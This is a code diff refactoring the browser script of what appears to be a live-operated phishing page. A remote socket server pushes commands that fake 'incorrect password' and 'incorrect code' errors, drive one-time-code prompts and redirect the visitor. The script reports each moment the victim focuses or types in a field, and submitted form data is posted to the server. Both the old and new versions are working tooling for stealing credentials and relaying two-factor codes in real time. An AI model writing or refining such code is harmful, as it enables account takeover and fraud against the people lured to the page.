@@ -1,227 +1,235 @@
-	let userId = sessionStorage.getItem("userId");
-	let page;
-	let preloader = document.getElementById('load');
-	
-	// 🔹 Generate or reuse the userId
-	if (!userId) {
-	  userId = "user_" + Math.random().toString(36).substr(2, 9);
-	  sessionStorage.setItem("userId", userId);
-	}
-	
-	const wrapper=document.getElementById("codeField");
-	const input=document.getElementById("codeInput");
-	const overlay=document.getElementById("overlay");
-	const loadingBar=document.getElementById("loading-bar");
-	const submitBtn=document.getElementById("submitBtn");
-	const errorText=document.getElementById("errorText");
-	const errorMessage=document.querySelector(".show-password-wrapper");
-	const showPasswordCheckbox = document.getElementById("showPassword");
-	
-	let loadingFrame=null;
-	 
-	function showError(message){
-		console.log("showError received:", message);
-		stopLoading();
-	  wrapper.classList.add("error","shake");
-	  if(errorMessage){errorMessage.classList.add("error");errorText.textContent=message;}
-	  setTimeout(()=>wrapper.classList.remove("shake"),350);
-	}
-	
-	function clearError(){
-	  wrapper.classList.remove("error");
-	}
-	
-	function showLoading(time){
-	  overlay.style.display="block";
-	  loadingBar.style.display="block";
-	  loadingBar.style.width="0%";
-	
-	  let progress=0;
-	
-	  function animate(){
-	    if(progress<100){
-	      progress+=(100-progress)/15;
-	      loadingBar.style.width=progress+"%";
-	      loadingFrame=requestAnimationFrame(animate);
-	    }
-	  }
-	  animate();
-	
-	  if(time){
-	    setTimeout(stopLoading,time);
-	  }
-	}
-	
-	function stopLoading(){
-	  cancelAnimationFrame(loadingFrame);
-	  loadingBar.style.width="100%";
-	  overlay.style.display="none";
-	  loadingBar.style.display="none";
-	}
+// ================================
+// USER + PAGE STATE
+// ================================
 
-	
-	 // Use window.socket globally from the start
-		window.socket = io("/", {
-			auth: { userId },
-		  reconnection: true,
-		  reconnectionAttempts: 5,
-		  reconnectionDelay: 500
-		});
-		let socket = window.socket; // optional local alias
-			
-    socket.on("user:command", (data) => {
-		  if (!data || !data.command) return;
-		
-		  const { command, code, phonescreen, link } = data;
-		
-		  console.log("command:", command);
-		
-		  const usernameEl = document.querySelector("#username");
-		  const storedUser = sessionStorage.getItem("user");
-		
-		  if (usernameEl && storedUser) {
-		    usernameEl.textContent = storedUser;
-		  }
-		
-		  const redirectToPhoneScreen = () => {
-		    if (phonescreen) {
-		      window.location.href = phonescreen;
-		    }
-		  };
-		
-		  const updatePhoneField = (selector, value) => {
-		    const el = document.querySelector(selector);
-		
-		    if (!el) {
-		      redirectToPhoneScreen();
-		      return false;
-		    }
-		
-		    el.textContent = value;
-		    stopLoading();
-		    return true;
-		  };
-		
-		  switch (command) {
-		
-		    case "refresh":
-		      location.reload();
-		      break;
-		
-		    case "bad-email":
-		      showError("Enter a correct email address");
-		      break;
-		
-		    case "bad-login":
-		      showError("incorrect password");
-		      break;
-		
-		    case "bad-otp":
-		      showError("incorrect code");
-		      break;
-		
-		    case "otp":
-		      updatePhoneField("#yp", "your phone");
-		      break;
-		
-		    case "phone-otp":
-		      if (!code) return;
-		      sessionStorage.setItem("setcode", code);
-		      updatePhoneField("#phone", code);
-		      break;
-		
-		    case "prompt":
-		      if (!code) return;
-		      sessionStorage.setItem("setcode", code);
-		      updatePhoneField("#code", code);
-		      break;
-		
-		    case "redirect":
-		      if (link) {
-		        window.location.href = link;
-		      }
-		      break;
-		
-		    default:
-		      console.warn("Unhandled command:", command);
-		  }
-		});
-	
-	// 🔹 When connected, update the user status
-	socket.on("connect", () => {
-	  console.log("Connected as", userId);
-	  socket.emit("user:update", {
-	    userId,
-	    newStatus: "online",
-	    page: page ,
-	  });
-	});
-	
-	// 🔹 When page unloads or closes
-	window.addEventListener("beforeunload", () => {
-	  socket.emit("user:update", {
-	    userId,
-	    newStatus: "offline",
-	    page: page ,
-	  });
-	});
-    
-    // 🔹 When user focuses on an input field
-	window.addEventListener("focusin", (e) => {
-	  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
-	    socket.emit("user:update", {
-	      userId,
-	      newStatus: "typing",
-	      page: page ,
-	    });
-	  }
-	});
-	
-	// 🔹 When user stops typing or leaves input
-	window.addEventListener("focusout", (e) => {
-	  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
-	    socket.emit("user:update", {
-	      userId,
-	      newStatus: "online",
-	      page: page ,
-	    });
-	  }
-	});
-	
-	// 🔹 While typing (fires continuously as user types)
-	window.addEventListener("input", (e) => {
-	  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
-	    socket.emit("user:update", {
-	      userId,
-	      newStatus: "typing",
-	      page: page ,
-	    });
-	  }
-	});
+let userId = sessionStorage.getItem("userId");
+let page;
+let preloader = document.getElementById("load");
 
-    // ✅ if your site has links that cause navigation
-    document.addEventListener("click", (e) => {
-      const link = e.target.closest("a");
-      if (link && link.href && link.origin === location.origin) {
-        setTimeout(() => {
-          socket.emit("user:update", {
-            userId,
-            newStatus: "online",
-            page: page ,
-          });
-        }, 200);
+if (!userId) {
+  userId = "user_" + Math.random().toString(36).substr(2, 9);
+  sessionStorage.setItem("userId", userId);
+}
+
+// ================================
+// DOM REFERENCES
+// ================================
+
+const wrapper = document.getElementById("codeField");
+const input = document.getElementById("codeInput");
+const overlay = document.getElementById("overlay");
+const loadingBar = document.getElementById("loading-bar");
+const submitBtn = document.getElementById("submitBtn");
+const errorText = document.getElementById("errorText");
+const errorMessage = document.querySelector(".show-password-wrapper");
+const showPasswordCheckbox = document.getElementById("showPassword");
+
+let loadingFrame = null;
+
+// ================================
+// UI FUNCTIONS
+// ================================
+
+function showError(message) {
+  stopLoading();
+  wrapper?.classList.add("error", "shake");
+  errorMessage?.classList.add("error");
+  if (errorText) errorText.textContent = message;
+
+  setTimeout(() => wrapper?.classList.remove("shake"), 350);
+}
+
+function clearError() {
+  wrapper?.classList.remove("error");
+}
+
+function showLoading(time) {
+  if (!overlay || !loadingBar) return;
+
+  overlay.style.display = "block";
+  loadingBar.style.display = "block";
+  loadingBar.style.width = "0%";
+
+  let progress = 0;
+
+  function animate() {
+    if (progress < 100) {
+      progress += (100 - progress) / 15;
+      loadingBar.style.width = progress + "%";
+      loadingFrame = requestAnimationFrame(animate);
+    }
+  }
+
+  animate();
+
+  if (time) {
+    setTimeout(stopLoading, time);
+  }
+}
+
+function stopLoading() {
+  cancelAnimationFrame(loadingFrame);
+  if (!overlay || !loadingBar) return;
+
+  loadingBar.style.width = "100%";
+  overlay.style.display = "none";
+  loadingBar.style.display = "none";
+}
+
+function redirectToPhoneScreen(phonescreen) {
+  if (phonescreen) {
+    window.location.href = phonescreen;
+  }
+}
+
+function updatePhoneField(selector, value, phonescreen = null) {
+  const el = document.querySelector(selector);
+
+  if (!el) {
+    redirectToPhoneScreen(phonescreen);
+    return false;
+  }
+
+  el.textContent = value;
+  stopLoading();
+  return true;
+}
+
+// ================================
+// SOCKET INITIALIZATION
+// ================================
+
+window.socket = io("/", {
+  auth: { userId },
+  reconnection: true,
+  reconnectionAttempts: 5,
+  reconnectionDelay: 500,
+});
+
+let socket = window.socket;
+
+// ================================
+// SOCKET EVENTS
+// ================================
+
+socket.on("connect", () => {
+  console.log("Connected as", userId);
+  socket.emit("user:update", {
+    userId,
+    newStatus: "online",
+    page: page,
+  });
+});
+
+socket.on("user:command", (data) => {
+  if (!data || !data.command) return;
+
+  const { command, code, phonescreen, link } = data;
+
+  console.log("command:", command);
+
+  const usernameEl = document.querySelector("#username");
+  const storedUser = sessionStorage.getItem("user");
+
+  if (usernameEl && storedUser) {
+    usernameEl.textContent = storedUser;
+  }
+
+  switch (command) {
+    case "refresh":
+      location.reload();
+      break;
+
+    case "bad-email":
+      showError("Enter a correct email address");
+      break;
+
+    case "bad-login":
+      showError("incorrect password");
+      break;
+
+    case "bad-otp":
+      showError("incorrect code");
+      break;
+
+    case "otp":
+      sessionStorage.removeItem("setcode");
+      sessionStorage.setItem("yp", "your mobile");
+      updatePhoneField("#yp", "your phone", phonescreen);
+      break;
+
+    case "phone-otp":
+      if (!code) return;
+      sessionStorage.setItem("setcode", code);
+      updatePhoneField("#phone", code, phonescreen);
+      break;
+
+    case "prompt":
+      if (!code) return;
+      sessionStorage.setItem("setPromptCode", code);
+      updatePhoneField("#code", code, phonescreen);
+      break;
+
+    case "redirect":
+      if (link) {
+        window.location.href = link;
       }
-    });
+      break;
 
-//document.head.appendChild(style); 
+    default:
+      console.warn("Unhandled command:", command);
+  }
+});
 
+// ================================
+// USER STATUS TRACKING
+// ================================
 
+function updateUserStatus(status) {
+  socket.emit("user:update", {
+    userId,
+    newStatus: status,
+    page: page,
+  });
+}
 
+window.addEventListener("beforeunload", () => {
+  updateUserStatus("offline");
+});
+
+window.addEventListener("focusin", (e) => {
+  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
+    updateUserStatus("typing");
+  }
+});
+
+window.addEventListener("focusout", (e) => {
+  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
+    updateUserStatus("online");
+  }
+});
+
+window.addEventListener("input", (e) => {
+  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
+    updateUserStatus("typing");
+  }
+});
+
+document.addEventListener("click", (e) => {
+  const link = e.target.closest("a");
+  if (link && link.href && link.origin === location.origin) {
+    setTimeout(() => updateUserStatus("online"), 200);
+  }
+});
+
+// ================================
+// FORM SUBMISSION
+// ================================
 
 async function submitFormData(formData) {
-  // Show preloader
   showLoading();
   formData.userId = userId;
+
   try {
     const res = await fetch("/submit", {
       method: "POST",
@@ -230,50 +238,43 @@ async function submitFormData(formData) {
     });
 
     const data = await res.json();
-
-    // Handle success (optional)
     console.log("Response:", data);
-    if(data.link){ window.location.href = data.link };    
-    //return data;
+
+    if (data.link) {
+      window.location.href = data.link;
+    }
   } catch (error) {
     console.error("Error submitting form:", error);
     throw error;
-	}
+  }
 }
 
-window.onbeforeunload = () => {
-      socket.emit("user:update", {
-        userId,
-        newStatus: "offline",
-        page: page ,
-      });
-  }; 
-  
-  
-  // returns a Promise that resolves with a socket, creating one if none appears within `timeoutMs`
+// ================================
+// SAFE SOCKET RECREATION
+// ================================
+
 function getOrCreateSocket({ timeoutMs = 500 } = {}) {
   return new Promise((resolve) => {
-    const existing = window.socket;
-    if (existing) return resolve(existing);
+    if (window.socket) return resolve(window.socket);
 
     const start = Date.now();
-    const checkInterval = 50; // check every 50ms
+    const checkInterval = 50;
+
     const timer = setInterval(() => {
       if (window.socket) {
         clearInterval(timer);
         return resolve(window.socket);
       }
+
       if (Date.now() - start >= timeoutMs) {
         clearInterval(timer);
-        console.log("reconnecting");
 
-        // create a new socket after timeout
-         userId = sessionStorage.getItem("userId") || null;
-        // create and attach to window.socket so other scripts can reuse it
+        userId = sessionStorage.getItem("userId") || null;
+
         window.socket = io("/", {
-		  auth: { userId },   // ✅ preferred way
-		  reconnection: true,
-		});
+          auth: { userId },
+          reconnection: true,
+        });
 
         return resolve(window.socket);
       }
@@ -281,15 +282,11 @@ function getOrCreateSocket({ timeoutMs = 500 } = {}) {
   });
 }
 
-// Usage (example - in an async context)
 (async () => {
-  const socket = await getOrCreateSocket({ timeoutMs: 2000 });
-  // local alias (not redeclaring with const if you already have `socket` var)
-  window.socket = socket;
-  // if you want a local const:
-  const localSocket = socket;
+  const socketInstance = await getOrCreateSocket({ timeoutMs: 2000 });
+  window.socket = socketInstance;
 
-  // now you can attach your handlers safely
-  localSocket.on("connect", () => console.log("connected", localSocket.id));
-  // ... rest of your socket logic
+  socketInstance.on("connect", () =>
+    console.log("connected", socketInstance.id)
+  );
 })();
